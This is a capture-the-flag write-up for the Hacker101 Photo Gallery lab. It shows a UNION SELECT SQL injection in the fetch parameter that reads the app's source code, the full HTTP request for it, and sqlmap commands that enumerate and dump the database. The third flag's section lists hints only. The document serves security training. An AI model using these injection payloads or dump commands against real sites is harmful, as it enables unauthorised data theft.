# Hacker 101 CTF Photo Gallery

This CTF was quite fun in my opinion

---

#### Flag 0

-- <b>Hints</b> --

```html
<ul>
  <li>
    Consider how you might build this system yourself. What would the query for fetch look like?
  </li>
  <li>Take a few minutes to consider the state of the union</li>
  <li>This application runs on the uwsgi-nginx-flask-docker image</li>
</ul>
```

For this challenge I very much lent on the hints but once I saw the uswgni-nginx-flask-docker hint, the hunt was on. I've dealt with a lot python projects as a developer and I've seen this quite a bit.

So... With the hints in mind I went to the /fetch query with this payload

fetch?id=0+UNION+SELECT+’main.py’

from my burp inteceptor and presto! FLAG in the python source code.

```http
GET /fetch?id=0+UNION+SELECT+'main.py' HTTP/2
Host: <target>
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.140 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

---

#### Flag 1

-- <b>Hints</b> --

```html
<ul>
  <li>I never trust a kitten I can't see</li>
  <li>Or a query whose results I can't see, for that matter</li>
</ul>
```

After the first flag I went back to the index page and decided to see what this invisible image is.

I did laugh a bit when the hints said <i>I never trust a kitten I can't see</i> because those were my thoughts exactly.

I tried simply fetching the file via the fetch paramater but no dice.

It is already confirmed that this application is vulnerable to SQLi so maybe I could try something targetting this pesky image.

After a few failures targeting the image I decided to pull out sqlmap; I need to know more about the database and storage and seeing as we have already utilised SQLi, this should yield something interesting... hopefully..

use a id that doesn't cause an error

```sh
sqlmap -u <target>/fetch?id=1 --dbs
```

with this I found that there is a database called 'level5'

```sh
sqlmap -u <target>/fetch?id=1 --dbs --table=level5 --dump --threads=2
```

this command showed me that there are two tables and showed values for our mysterious image.. including the FLAG

---

#### Flag 2

-- <b>Hints</b> --

```html
<ul>
  <li>That method of finding the size of an album seems suspicious</li>
  <li>Stacked queries rarely work. But when they do, make absolutely sure that you're committed</li>
  <li>Be aware of your environment</li>
</ul>
```

---
